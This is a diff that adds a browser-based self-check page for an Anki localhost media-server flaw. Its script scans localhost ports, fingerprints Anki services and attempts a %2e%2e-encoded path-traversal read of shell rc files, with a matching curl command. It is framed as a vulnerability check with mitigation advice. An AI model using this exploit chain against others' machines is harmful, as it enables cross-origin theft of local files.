@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Anki PNA — Local Vulnerability Check</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: #fafafa;
+      color: #1a1a2e;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      min-height: 100vh;
+      padding: 40px 20px 60px;
+      line-height: 1.5;
+    }
+    .container { max-width: 880px; margin: 0 auto; }
+    h1 { font-size: 1.7rem; font-weight: 700; margin-bottom: 6px; }
+    .subtitle { font-size: 0.92rem; color: #6b7280; margin-bottom: 28px; }
+    a { color: #7c3aed; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    h2 { font-size: 1.05rem; font-weight: 600; margin-bottom: 12px; }
+    p, li { font-size: 0.92rem; }
+    code, .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 0.86rem; }
+
+    .card {
+      background: #fff;
+      border: 1px solid #e5e7eb;
+      border-radius: 12px;
+      padding: 22px 24px;
+      margin-bottom: 18px;
+    }
+
+    .row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+    .row > * { flex-shrink: 0; }
+
+    input[type="text"], select {
+      padding: 8px 12px;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      font-size: 0.88rem;
+      font-family: inherit;
+      outline: none;
+      transition: border-color 0.15s;
+      background: #fff;
+    }
+    input[type="text"] { flex: 1; min-width: 200px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
+    input[type="text"]:focus, select:focus { border-color: #7c3aed; }
+
+    .btn {
+      background: #7c3aed;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 8px 18px;
+      font-size: 0.88rem;
+      font-family: inherit;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s, opacity 0.15s;
+    }
+    .btn:hover:not(:disabled) { background: #6d28d9; }
+    .btn:disabled { opacity: 0.45; cursor: not-allowed; }
+    .btn-danger { background: #dc2626; }
+    .btn-danger:hover:not(:disabled) { background: #b91c1c; }
+
+    .kv { display: grid; grid-template-columns: 160px 1fr; gap: 6px 16px; font-size: 0.88rem; }
+    .kv .k { color: #6b7280; }
+    .kv .v { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; word-break: break-all; }
+
+    .log {
+      background: #0f172a;
+      color: #e2e8f0;
+      border-radius: 8px;
+      padding: 14px 16px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+      font-size: 0.82rem;
+      max-height: 240px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .log .ok { color: #34d399; }
+    .log .warn { color: #fbbf24; }
+    .log .err { color: #f87171; }
+    .log .dim { color: #94a3b8; }
+
+    pre.body {
+      background: #f3f4f6;
+      border: 1px solid #e5e7eb;
+      border-radius: 8px;
+      padding: 14px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+      font-size: 0.82rem;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 320px;
+      overflow-y: auto;
+      margin-top: 12px;
+    }
+
+    .verdict { padding: 18px 22px; border-radius: 12px; font-size: 0.95rem; }
+    .verdict.unknown { background: #f3f4f6; color: #4b5563; border: 1px solid #e5e7eb; }
+    .verdict.safe { background: #ecfdf5; color: #065f46; border: 1px solid #a7f3d0; }
+    .verdict.exposed { background: #fef2f2; color: #991b1b; border: 1px solid #fca5a5; }
+    .verdict h2 { margin-bottom: 6px; }
+
+    ul { padding-left: 20px; }
+    ul li { margin-bottom: 4px; }
+
+    .hint { font-size: 0.82rem; color: #6b7280; margin-top: 6px; }
+
+    details { margin-top: 8px; }
+    details summary { cursor: pointer; font-size: 0.85rem; color: #6b7280; }
+    details summary:hover { color: #7c3aed; }
+
+    .pill { display: inline-block; padding: 2px 8px; border-radius: 999px; font-size: 0.75rem; font-weight: 500; }
+    .pill-ok { background: #d1fae5; color: #065f46; }
+    .pill-warn { background: #fef3c7; color: #92400e; }
+    .pill-err { background: #fee2e2; color: #991b1b; }
+    .pill-neutral { background: #e5e7eb; color: #4b5563; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🔓 Anki PNA — Local Vulnerability Check</h1>
+    <p class="subtitle">
+      Tests whether your machine is exposed to the localhost-server attack class
+      Tavis Ormandy described
+      (<a href="https://xcancel.com/taviso/status/2051310678800253318" target="_blank" rel="noopener">thread</a>).
+      Run only against your own machine.
+    </p>
+
+    <div class="card">
+      <h2>How this works</h2>
+      <p>When Anki is running, it starts an HTTP server on a localhost port to serve media to its embedded WebView. If that server has permissive CORS and a path-traversal flaw, any website you visit can use your browser to read files from your home directory. This page simulates the malicious-site role: it scans for the server, fingerprints it, then attempts to read <code>~/.zshrc</code> via path traversal.</p>
+      <p style="margin-top:8px">For this to be a real cross-origin test, serve this page from a non-Anki origin (e.g. <code>python3 -m http.server 8000</code> in the playground root and open <code>http://127.0.0.1:8000/anki-pna/</code>). Firefox is the most permissive; Chrome may apply Private Network Access checks.</p>
+    </div>
+
+    <div class="card">
+      <h2>Environment</h2>
+      <div class="kv" id="env"></div>
+    </div>
+
+    <div class="card">
+      <h2>Step 1 — Scan localhost for Anki services</h2>
+      <p>Probes <code>:8765</code> for AnkiConnect (third-party addon) and a range of dynamic ports for Anki's built-in mediasrv. The scan uses <code>fetch</code> with short timeouts to detect listeners. Total scan time: ~10–20s.</p>
+      <div class="row" style="margin-top:14px">
+        <button class="btn" id="scanBtn">Run scan</button>
+        <span id="scanStatus" class="hint"></span>
+      </div>
+      <div class="log" id="scanLog" style="margin-top:14px; display:none"></div>
+      <div id="scanFindings" style="margin-top:14px"></div>
+    </div>
+
+    <div class="card" id="ankiConnectCard" style="display:none">
+      <h2>AnkiConnect (port 8765)</h2>
+      <div class="kv" id="acDetails"></div>
+    </div>
+
+    <div class="card" id="mediaSrvCard" style="display:none">
+      <h2>Step 2 — File read against built-in mediasrv</h2>
+      <p>Path-traversal attempt: the request joins your input onto the server's media base directory. Each <code>..</code> segment is sent as <code>%2e%2e</code> so the URL parser doesn't collapse it before transmission — the server decodes it back to <code>..</code> on the other side.</p>
+
+      <div class="row" style="margin-top:12px">
+        <label for="manualPort" class="hint" style="margin-right:6px">Port:</label>
+        <input type="text" id="manualPort" style="max-width:90px; flex:0" placeholder="56875" />
+        <span class="hint">override scan result; useful when fingerprint was CORS-blocked</span>
+      </div>
+
+      <div class="row" style="margin-top:12px">
+        <label for="filePath" class="hint" style="margin-right:6px">File:</label>
+        <input type="text" id="filePath" value="../.zshrc" />
+        <select id="presetPath">
+          <option value="">Presets…</option>
+          <option value="../.zshrc">../.zshrc</option>
+          <option value="../../../../../.zshrc">../../../../../.zshrc (deep)</option>
+          <option value="../.bashrc">../.bashrc</option>
+          <option value="../.profile">../.profile</option>
+          <option value="/etc/hostname">/etc/hostname</option>
+        </select>
+        <button class="btn btn-danger" id="readBtn">Read file</button>
+      </div>
+      <div class="hint">Default targets your shell rc file. We deliberately avoid <code>~/.ssh/</code> — the goal is to prove the primitive, not surface secrets.</div>
+
+      <pre class="body" id="readResult" style="display:none"></pre>
+    </div>
+
+    <div class="card">
+      <h2>Verdict</h2>
+      <div id="verdict" class="verdict unknown">
+        <h2>Not yet tested</h2>
+        <p>Run the scan above to evaluate exposure.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Mitigation if exposed</h2>
+      <ul>
+        <li>Update Anki to the latest version. Tavis disclosed this to the developers; expect a patched release.</li>
+        <li>Quit Anki when not actively using it — the server only runs while Anki is open.</li>
+        <li>For AnkiConnect specifically: ensure an <code>apiKey</code> is set in its config so destructive actions are blocked.</li>
+        <li>Use a browser that enforces Private Network Access (recent Chrome). Firefox/Safari don't yet.</li>
+      </ul>
+    </div>
+  </div>
+
+<script>
+(() => {
+  // ---------- Targets ----------
+  const ANKICONNECT_PORT = 8765;
+
+  // Mediasrv picks an OS-assigned ephemeral port. Covers Windows pre-Vista
+  // (1024-5000, the screenshot showed 2144) plus the standard ephemeral range
+  // used by Linux/macOS/modern Windows (32768-65535). ~36k ports total; with
+  // high concurrency and short timeouts the scan finishes in ~10-15s.
+  const MEDIASRV_PORTS = (() => {
+    const arr = [];
+    for (let p = 1024; p <= 5000; p++) arr.push(p);
+    for (let p = 32768; p <= 65535; p++) arr.push(p);
+    return arr.filter(p => p !== ANKICONNECT_PORT);
+  })();
+
+  const CONCURRENCY = 120;
+  const PROBE_TIMEOUT_MS = 200;
+  const FETCH_TIMEOUT_MS = 1500;
+
+  // ---------- DOM helpers ----------
+  const $ = (id) => document.getElementById(id);
+  const env = $("env");
+  const scanBtn = $("scanBtn");
+  const scanStatus = $("scanStatus");
+  const scanLog = $("scanLog");
+  const scanFindings = $("scanFindings");
+  const acCard = $("ankiConnectCard");
+  const acDetails = $("acDetails");
+  const msCard = $("mediaSrvCard");
+  const filePath = $("filePath");
+  const presetPath = $("presetPath");
+  const readBtn = $("readBtn");
+  const readResult = $("readResult");
+  const verdictEl = $("verdict");
+
+  function kvRow(parent, k, v) {
+    const dk = document.createElement("div");
+    dk.className = "k"; dk.textContent = k;
+    const dv = document.createElement("div");
+    dv.className = "v";
+    if (v instanceof Node) dv.appendChild(v); else dv.textContent = v;
+    parent.appendChild(dk); parent.appendChild(dv);
+  }
+
+  function pill(text, kind) {
+    const s = document.createElement("span");
+    s.className = "pill pill-" + kind;
+    s.textContent = text;
+    return s;
+  }
+
+  function log(msg, cls) {
+    scanLog.style.display = "block";
+    const span = document.createElement("span");
+    if (cls) span.className = cls;
+    span.textContent = msg + "\n";
+    scanLog.appendChild(span);
+    scanLog.scrollTop = scanLog.scrollHeight;
+  }
+
+  // ---------- Environment panel ----------
+  function fillEnv() {
+    kvRow(env, "Page origin", location.origin);
+    kvRow(env, "Browser", navigator.userAgent);
+    const isFirefox = /Firefox/i.test(navigator.userAgent);
+    const isChrome = /Chrome/i.test(navigator.userAgent) && !/Edg/.test(navigator.userAgent);
+    const isSafari = /Safari/i.test(navigator.userAgent) && !isChrome;
+    let pnaNote;
+    if (isChrome) pnaNote = pill("Chrome — may prompt for PNA", "warn");
+    else if (isFirefox) pnaNote = pill("Firefox — no PNA enforcement", "err");
+    else if (isSafari) pnaNote = pill("Safari — no PNA enforcement", "err");
+    else pnaNote = pill("Unknown", "neutral");
+    kvRow(env, "PNA support", pnaNote);
+    if (location.origin.startsWith("http://127.0.0.1") || location.origin.startsWith("http://localhost")) {
+      kvRow(env, "Cross-origin", pill("Yes — different localhost port", "ok"));
+    } else if (location.origin.startsWith("file://")) {
+      kvRow(env, "Cross-origin", pill("file:// — limited test, prefer local server", "warn"));
+    } else if (location.protocol === "https:") {
+      kvRow(env, "Cross-origin", pill("Public origin — most realistic, browser may block", "warn"));
+    } else {
+      kvRow(env, "Cross-origin", "—");
+    }
+  }
+
+  // ---------- Probing primitives ----------
+  // Detect whether a port has a listener using no-cors fetch + AbortController.
+  // Resolves true if the server returned anything (opaque response), false on
+  // connection refused / TLS error / timeout.
+  async function probePort(port) {
+    const ctrl = new AbortController();
+    const t = setTimeout(() => ctrl.abort(), PROBE_TIMEOUT_MS);
+    try {
+      await fetch(`http://127.0.0.1:${port}/`, {
+        method: "GET",
+        mode: "no-cors",
+        cache: "no-store",
+        signal: ctrl.signal,
+        credentials: "omit",
+      });
+      clearTimeout(t);
+      return true;
+    } catch (_) {
+      clearTimeout(t);
+      return false;
+    }
+  }
+
+  async function fetchCors(url, init) {
+    const ctrl = new AbortController();
+    const t = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS);
+    try {
+      const r = await fetch(url, { ...init, signal: ctrl.signal, cache: "no-store", credentials: "omit" });
+      clearTimeout(t);
+      return r;
+    } catch (e) {
+      clearTimeout(t);
+      throw e;
+    }
+  }
+
+  // Run a worker pool over an array.
+  async function pool(items, n, worker) {
+    const queue = items.slice();
+    const results = [];
+    const runners = [];
+    for (let i = 0; i < n; i++) {
+      runners.push((async () => {
+        while (queue.length) {
+          const item = queue.shift();
+          const r = await worker(item);
+          if (r !== undefined) results.push(r);
+        }
+      })());
+    }
+    await Promise.all(runners);
+    return results;
+  }
+
+  // ---------- AnkiConnect probe ----------
+  async function probeAnkiConnect() {
+    let result = { present: false };
+    try {
+      const r = await fetchCors(`http://127.0.0.1:${ANKICONNECT_PORT}/`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "requestPermission", version: 6 }),
+      });
+      if (r.ok) {
+        const j = await r.json();
+        result.present = true;
+        result.cors = "Access-Control-Allow-Origin: " + (r.headers.get("access-control-allow-origin") || "(none)");
+        result.permissionResp = j;
+        result.requireApikey = !!(j.result && j.result.requireApikey);
+        // Also try a simple action to see if a key is enforced.
+        const r2 = await fetchCors(`http://127.0.0.1:${ANKICONNECT_PORT}/`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ action: "deckNames", version: 6 }),
+        });
+        const j2 = await r2.json();
+        result.deckNamesResp = j2;
+        result.keyEnforced = j2.error && /api key/i.test(j2.error);
+      }
+    } catch (e) {
+      result.error = String(e);
+    }
+    return result;
+  }
+
+  function renderAnkiConnect(ac) {
+    if (!ac.present) {
+      acCard.style.display = "block";
+      kvRow(acDetails, "Status", pill("Not detected on :8765", "ok"));
+      return;
+    }
+    acCard.style.display = "block";
+    kvRow(acDetails, "Status", pill("Listening on :8765", "warn"));
+    kvRow(acDetails, "CORS", ac.cors);
+    if (ac.requireApikey) {
+      kvRow(acDetails, "API key", pill("Required (defense-in-depth)", "ok"));
+    } else {
+      kvRow(acDetails, "API key", pill("Not required — destructive actions exposed", "err"));
+    }
+    if (ac.keyEnforced) {
+      kvRow(acDetails, "deckNames result", pill("Blocked by API key — actions safe", "ok"));
+    } else if (ac.deckNamesResp && ac.deckNamesResp.result) {
+      kvRow(acDetails, "deckNames result", pill("LEAKED — attacker can enumerate decks", "err"));
+      const det = document.createElement("details");
+      const sum = document.createElement("summary"); sum.textContent = "Show leaked deck names";
+      const pre = document.createElement("pre"); pre.className = "body";
+      pre.textContent = JSON.stringify(ac.deckNamesResp.result, null, 2);
+      det.appendChild(sum); det.appendChild(pre);
+      acDetails.appendChild(det);
+    }
+  }
+
+  // ---------- Mediasrv detection ----------
+  function looksLikeAnki(text, headers) {
+    const t = (text || "").slice(0, 4096).toLowerCase();
+    if (t.includes("invalid path:")) return true; // mediasrv error format
+    if (t.includes("anki")) return true;
+    if (t.includes("_anki/")) return true;
+    if (t.includes("collection.media")) return true;
+    const server = (headers.get && headers.get("server") || "").toLowerCase();
+    if (server.includes("waitress")) return true; // Anki ships waitress
+    if (server.includes("anki")) return true;
+    return false;
+  }
+
+  function corsLooksReadable(acao, pageOrigin) {
+    if (!acao) return false;
+    if (acao === "*") return true;
+    // Match exact origin (the only CORS form browsers honor besides *)
+    if (acao === pageOrigin) return true;
+    // Tokens like "127.0.0.1" alone are not valid origins; browsers won't
+    // accept them, but flag this as "permissive intent" for the report.
+    return false;
+  }
+
+  // Try a known Anki path first; if that doesn't work, fall back to /
+  async function fingerprintPort(port) {
+    const result = { port, anki: null, cors: "(none)", status: null };
+    for (const path of ["/_anki/i18nResources.js", "/"]) {
+      try {
+        const r = await fetchCors(`http://127.0.0.1:${port}${path}`, { method: "GET" });
+        const acao = r.headers.get("access-control-allow-origin");
+        const server = r.headers.get("server") || "";
+        result.status = r.status;
+        result.cors = acao || "(none)";
+        result.server = server;
+        let body = "";
+        try { body = await r.text(); } catch (_) {}
+        result.sample = body.slice(0, 400);
+        if (looksLikeAnki(body, r.headers)) {
+          result.anki = true;
+          result.corsReadable = corsLooksReadable(acao, location.origin);
+          return result;
+        }
+        result.anki = false;
+        return result;
+      } catch (e) {
+        // CORS-block or other fetch failure — try next path
+        result.error = String(e);
+      }
+    }
+    return result;
+  }
+
+  // ---------- Scan flow ----------
+  let scanResults = null;
+
+  async function runScan() {
+    scanBtn.disabled = true;
+    scanStatus.textContent = "scanning…";
+    scanLog.innerHTML = ""; scanLog.style.display = "block";
+    scanFindings.innerHTML = "";
+    acCard.style.display = "none"; acDetails.innerHTML = "";
+    msCard.style.display = "none"; readResult.style.display = "none";
+
+    const t0 = performance.now();
+    log(`scanning ${MEDIASRV_PORTS.length} ports for mediasrv…`, "dim");
+
+    // Step 1: AnkiConnect
+    log(`probing AnkiConnect on :${ANKICONNECT_PORT}…`);
+    const ac = await probeAnkiConnect();
+    if (ac.present) {
+      log(`  found AnkiConnect; key required: ${ac.requireApikey}`, ac.keyEnforced ? "ok" : "err");
+    } else {
+      log(`  no AnkiConnect on :${ANKICONNECT_PORT}`, "ok");
+    }
+    renderAnkiConnect(ac);
+
+    // Step 2: scan ports for listeners
+    let openPorts = [];
+    let scanned = 0;
+    await pool(MEDIASRV_PORTS, CONCURRENCY, async (port) => {
+      const open = await probePort(port);
+      scanned++;
+      if (scanned % 250 === 0) {
+        scanStatus.textContent = `scanned ${scanned}/${MEDIASRV_PORTS.length} ports…`;
+      }
+      if (open) {
+        openPorts.push(port);
+        log(`  :${port} listening`, "warn");
+      }
+    });
+    log(`scanned ${scanned} ports in ${Math.round(performance.now()-t0)}ms; ${openPorts.length} listening`, "dim");
+
+    // Step 3: fingerprint listeners
+    const fingerprints = [];
+    for (const port of openPorts) {
+      log(`fingerprinting :${port}…`);
+      const fp = await fingerprintPort(port);
+      fingerprints.push(fp);
+      if (fp.anki === true) {
+        log(`  :${port} matches Anki signatures (HTTP ${fp.status})`, "err");
+      } else if (fp.anki === false) {
+        log(`  :${port} returned readable body, not Anki`, "dim");
+      } else if (fp.error) {
+        log(`  :${port} CORS-blocked or refused: ${fp.error}`, "dim");
+      } else {
+        log(`  :${port} responded HTTP ${fp.status}, body not CORS-readable`, "dim");
+      }
+    }
+
+    const ankiHit = fingerprints.find(f => f.anki === true);
+    const corsBlockedListeners = fingerprints.filter(f => f.error && /Failed to fetch|Network/i.test(f.error));
+    scanResults = { ac, ankiHit, fingerprints, corsBlockedListeners };
+
+    // Findings summary
+    const summary = document.createElement("div");
+    summary.className = "kv";
+    if (ankiHit) {
+      const sev = ankiHit.corsReadable ? "err" : "warn";
+      const label = ankiHit.corsReadable
+        ? `Detected on :${ankiHit.port} — permissive CORS`
+        : `Detected on :${ankiHit.port} — restrictive CORS`;
+      kvRow(summary, "Anki mediasrv", pill(label, sev));
+      kvRow(summary, "Server", ankiHit.server || "(none)");
+      kvRow(summary, "CORS", ankiHit.cors);
+      msCard.style.display = "block";
+    } else if (openPorts.length > 0) {
+      const allBlocked = scanResults.corsBlockedListeners.length === fingerprints.length;
+      const label = allBlocked
+        ? "Listeners exist but all CORS-blocked — safe"
+        : "No Anki signature on readable listeners";
+      kvRow(summary, "Anki mediasrv", pill(label, "ok"));
+      const list = openPorts.map(p => `:${p}`).join(", ");
+      kvRow(summary, "Listeners scanned", list);
+      if (allBlocked) {
+        const note = document.createElement("div");
+        note.className = "hint";
+        note.style.gridColumn = "1 / -1";
+        note.style.marginTop = "6px";
+        note.textContent = "Every listening port refused cross-origin reads. Even if one of them is Anki's mediasrv, your browser would block a malicious site from reading the response — so the path-traversal attack chain can't complete.";
+        summary.appendChild(note);
+      }
+      // Show the file-read card so the user can manually target a port (e.g.
+      // they know Anki's via `lsof -i -P -n | grep LISTEN`).
+      if (scanResults.corsBlockedListeners.length > 0) {
+        msCard.style.display = "block";
+      }
+    } else {
+      kvRow(summary, "Anki mediasrv", pill("Not detected — Anki may be closed or out of scan range", "ok"));
+    }
+    scanFindings.appendChild(summary);
+
+    // Verdict (preliminary, before file-read attempt)
+    setVerdict("preliminary");
+
+    scanBtn.disabled = false;
+    scanStatus.textContent = `done in ${Math.round((performance.now()-t0)/1000)}s`;
+  }
+
+  // ---------- File-read attempt ----------
+  // Encode '..' segments so the URL parser doesn't collapse them. The server
+  // decodes %2e%2e back to '..' before resolving the path; if it doesn't have
+  // a traversal check, the file is served. (Bare '..' in the URL is collapsed
+  // by both fetch() and curl-without-`--path-as-is`, so we never actually
+  // test traversal without this encoding.)
+  function buildExploitUrl(port, path) {
+    const trimmed = path.replace(/^\/+/, "");
+    const encoded = trimmed.split("/").map(seg => {
+      if (seg === "..") return "%2e%2e";
+      return encodeURIComponent(seg);
+    }).join("/");
+    return `http://127.0.0.1:${port}/${encoded}`;
+  }
+
+  async function attemptRead() {
+    if (!scanResults) return;
+    const manualPort = $("manualPort").value.trim();
+    const port = manualPort ? parseInt(manualPort, 10) : (scanResults.ankiHit && scanResults.ankiHit.port);
+    if (!port) {
+      readResult.style.display = "block";
+      readResult.textContent = "No port to attack — enter a port manually or rerun the scan.";
+      return;
+    }
+    const path = filePath.value.trim();
+    if (!path) return;
+    const url = buildExploitUrl(port, path);
+    readBtn.disabled = true;
+    readResult.style.display = "block";
+    readResult.textContent = `requesting ${url}…`;
+    let serverReached = false;
+    // First: a no-cors probe so we can tell "request reached server" apart
+    // from "CORS blocked the response read".
+    try {
+      await fetchCors(url, { method: "GET", mode: "no-cors" });
+      serverReached = true;
+    } catch (_) {
+      serverReached = false;
+    }
+    // Then: a cors fetch for body inspection.
+    try {
+      const r = await fetchCors(url, { method: "GET" });
+      const body = await r.text();
+      readResult.textContent =
+        `URL: ${url}\n` +
+        `HTTP ${r.status} ${r.statusText}\n` +
+        `Content-Type: ${r.headers.get("content-type") || "(none)"}\n` +
+        `Bytes: ${body.length}\n\n` +
+        (body.length ? body.slice(0, 8000) : "(empty body)");
+      const looksLikeRc = /^\s*#|\bbash\b|\balias\b|\bexport\b|\bPATH\b|\bzsh\b/m.test(body);
+      const exposed = r.ok && body.length > 0 && (looksLikeRc || /^[\x09\x0a\x0d\x20-\x7e]+$/.test(body.slice(0, 200)));
+      if (exposed) setVerdict("exposed", path);
+      else setVerdict("safe-after-read");
+    } catch (e) {
+      const lines = [`URL: ${url}`, `cors fetch failed: ${e}`, ""];
+      if (serverReached) {
+        lines.push("✓ The request DID reach the server (no-cors probe succeeded), but the response was blocked by CORS — the browser refused to deliver the body to this origin.");
+        lines.push("");
+        lines.push("To see the actual server response, run this in a terminal on your host:");
+        lines.push(`  curl -i --path-as-is '${url}'`);
+        lines.push("");
+        lines.push("If the server returns 403 'security leak!' or 404 'Invalid path', the path-traversal is blocked at the server too — your Anki has a defense-in-depth layer in addition to CORS.");
+      } else {
+        lines.push("✗ The request failed before reaching the server (port closed, refused, or browser PNA blocked).");
+      }
+      readResult.textContent = lines.join("\n");
+      setVerdict("safe-after-read");
+    } finally {
+      readBtn.disabled = false;
+    }
+  }
+
+  // ---------- Verdict rendering ----------
+  function setVerdict(state, detail) {
+    verdictEl.innerHTML = "";
+    const h = document.createElement("h2");
+    const p = document.createElement("p");
+    if (state === "preliminary") {
+      const ac = scanResults.ac;
+      const ms = scanResults.ankiHit;
+      verdictEl.className = "verdict";
+      if (ms && ms.corsReadable) {
+        verdictEl.classList.add("exposed");
+        h.textContent = "⚠ Anki mediasrv detected with permissive CORS";
+        p.textContent = `Server on :${ms.port} responds with CORS "${ms.cors}" — readable cross-origin. Click "Read file" to test whether path traversal also works.`;
+      } else if (ms) {
+        return setVerdict("preliminary-cors-safe");
+      } else if (scanResults.corsBlockedListeners && scanResults.corsBlockedListeners.length > 0) {
+        // Some listeners exist but refused cross-origin reads. Anki's
+        // mediasrv may be among them; if so, its CORS policy prevents the
+        // attack from completing.
+        verdictEl.classList.add("safe");
+        h.textContent = "✓ No exposed Anki mediasrv detected";
+        const ports = scanResults.corsBlockedListeners.map(f => `:${f.port}`).join(", ");
+        const acNote = ac.present
+          ? (ac.keyEnforced ? " AnkiConnect on :8765 is API-key-protected." : " ⚠ AnkiConnect on :8765 has no API key — destructive actions exposed.")
+          : "";
+        p.textContent = `Found ${scanResults.fingerprints.length} listening localhost service${scanResults.fingerprints.length === 1 ? "" : "s"}, of which ${scanResults.corsBlockedListeners.length} (${ports}) refused this page's cross-origin read. If Anki's mediasrv is among them, its CORS policy prevents the browser from delivering responses to a malicious site — the attack chain is broken.${acNote}`;
+      } else if (ac.present && !ac.keyEnforced) {
+        verdictEl.classList.add("exposed");
+        h.textContent = "⚠ AnkiConnect exposed without API key";
+        p.textContent = `AnkiConnect is reachable cross-origin and is not enforcing an API key. Any website you visit can manipulate your decks.`;
+      } else if (ac.present && ac.keyEnforced) {
+        verdictEl.classList.add("safe");
+        h.textContent = "✓ AnkiConnect found, but API-key-protected";
+        p.textContent = `AnkiConnect is on :${ANKICONNECT_PORT} with CORS *, but enforces an API key for actions. The mediasrv (the bug Tavis described) was not detected — Anki may be closed.`;
+      } else {
+        verdictEl.classList.add("safe");
+        h.textContent = "✓ No Anki services detected";
+        p.textContent = `Neither AnkiConnect nor Anki's mediasrv responded. If Anki was closed during the scan, launch it and re-scan to be sure.`;
+      }
+    } else if (state === "preliminary-cors-safe") {
+      verdictEl.className = "verdict safe";
+      h.textContent = "✓ Anki mediasrv detected but CORS-protected";
+      const ms = scanResults.ankiHit;
+      p.textContent = `Anki's mediasrv is on :${ms.port} but its CORS header (${ms.cors}) does not permit cross-origin reads — your browser will block any malicious site from reading responses regardless of path traversal. You can still try the file-read demo below to confirm.`;
+    } else if (state === "exposed") {
+      verdictEl.className = "verdict exposed";
+      h.textContent = "✗ Vulnerable — arbitrary file read confirmed";
+      p.textContent = `The mediasrv returned readable contents for "${detail}". Update Anki, quit it when not in use, and consider switching to a browser with PNA enforcement.`;
+    } else if (state === "safe-after-read") {
+      verdictEl.className = "verdict safe";
+      h.textContent = "✓ File read attempt did not return contents";
+      p.textContent = `The mediasrv either rejected the path traversal, returned an empty body, or its CORS policy didn't let the browser deliver the response. This specific exploit path is mitigated on your install — but the broader "localhost server + browser" pivot risk remains; keep Anki closed when not in use.`;
+    } else {
+      verdictEl.className = "verdict unknown";
+      h.textContent = "Not yet tested";
+      p.textContent = "Run the scan above to evaluate exposure.";
+    }
+    verdictEl.appendChild(h);
+    verdictEl.appendChild(p);
+  }
+
+  // ---------- Wire up ----------
+  fillEnv();
+  scanBtn.addEventListener("click", runScan);
+  readBtn.addEventListener("click", attemptRead);
+  presetPath.addEventListener("change", () => {
+    if (presetPath.value) { filePath.value = presetPath.value; presetPath.value = ""; }
+  });
+})();
+</script>
+</body>
+</html>
